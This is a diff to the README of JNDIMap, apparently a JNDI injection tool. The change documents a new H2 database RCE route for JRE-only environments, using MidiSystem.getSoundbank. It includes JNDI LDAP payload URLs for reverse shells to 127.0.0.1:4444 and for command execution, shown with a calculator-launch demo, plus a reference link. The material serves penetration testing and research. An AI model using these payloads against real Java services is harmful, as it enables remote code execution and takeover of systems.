@@ -260,12 +260,15 @@ ldap://127.0.0.1:1389/Factory/H2/Java/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Factory/H2/JavaScript/ReverseShell/127.0.0.1/4444
 ```
 
-In addition, JNDIMap also supports H2 RCE in **JRE environment** (based on ClassPathXmlApplicationContext, requires Spring dependency)
+In addition, JNDIMap also supports H2 RCE in **JRE environment**
 
 *Java 15 and above versions have deleted the Nashorn JS engine, and the JRE environment itself does not include the javac command, so the above Java/JavaScript method cannot be used to achieve RCE*
 
 ```bash
-# command execution in JRE
+Based on MidiSystem.getSoundbank method, only JRE + H2 dependency are required
+ldap://127.0.0.1:1389/Factory/H2/JRE/Soundbank/Command/open -a Calculator
+
+# based on ClassPathXmlApplicationContext, requires Spring dependency
 ldap://127.0.0.1:1389/Factory/H2/JRE/Spring/Command/open -a Calculator
 ```
 
@@ -506,3 +509,5 @@ java -jar JNDIMap.jar -useReferenceOnly
 [https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)
 
 [https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)
+
+[https://forum.butian.net/share/4414](https://forum.butian.net/share/4414)
